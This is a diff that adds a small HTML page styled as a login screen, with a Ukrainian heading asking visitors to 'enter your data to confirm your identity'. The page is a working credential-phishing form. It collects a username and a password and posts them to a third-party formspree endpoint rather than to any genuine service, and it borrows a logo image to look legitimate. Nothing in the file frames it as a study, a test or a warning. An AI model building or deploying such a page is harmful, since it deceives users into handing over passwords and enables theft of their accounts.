@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>F3</title>
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<style>
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+			outline: none;
+		}
+
+		body {
+			height: 100vh;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			flex-direction: column;
+			background: linear-gradient(90deg, rgba(131,58,180,1) 0%, rgba(253,29,29,1) 50%, rgba(252,176,69,1) 100%);
+		}
+
+		form {
+			display: flex;
+			justify-content: center;
+			text-align: center;
+			flex-direction: column;
+		}
+
+		input {
+			width: 400px;
+			height: 40px;
+			margin: 10px;
+			padding: 10px;
+			font-size: 18px;
+			font-family: montserrat;
+			font-weight: 400;
+			border-radius: 5px;
+			border: none;
+		}
+
+		button {
+			background-color: dodgerblue;
+			border: none;
+			padding: 10px 60px;
+			color: #fff;
+			font-weight: 900;
+			font-family: montserrat;
+			border-radius: 5px;
+			margin-top: 20px;
+		}
+
+		.logo {
+			width: 100px;
+			height: 100px;
+			background-image: url('https://play-lh.googleusercontent.com/csNhCMKLEAWeoqOjJW9b-GCeIOzv_DFRHq9NZiYmzXC1TvjmGrqVe5Bdtkfc0p0r_fc');
+			background-size: cover;
+			position: fixed;
+			top: 50px;
+		}
+
+		h1 {
+			color: white;
+			text-align: center;
+		}
+	</style>
+</head>
+<body>
+	<div class="logo"></div>
+	<h1>Введіть свої данні для підтвердження особистості</h1>
+	<form action="https://formspree.io/f/xgerydyd"method="POST">
+		<input type="email" placeholder="Username" name="_replyto">
+		<input type="password" placeholder="Password" name="message">
+
+		<button type="submit">Send</button>
+	</form>
+</body>
+</html>
